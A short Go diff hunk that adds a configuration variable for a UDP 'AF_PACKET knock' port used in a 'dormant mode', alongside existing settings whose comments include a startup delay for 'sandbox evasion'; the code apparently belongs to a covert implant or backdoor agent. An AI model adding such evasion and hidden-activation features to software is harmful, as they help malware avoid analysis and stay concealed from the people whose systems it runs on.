@@ -22,6 +22,7 @@ var (
 	cfgProxyPass   string // proxy password
 	cfgReadOnly    string // "true" to reject write operations
 	cfgDelay       string // startup delay in seconds (sandbox evasion)
+	cfgKnockPort   string // UDP port for AF_PACKET knock (dormant mode)
 	cfgVersion     string // version tag
 	cfgBuildCommit string // git short commit hash
 )
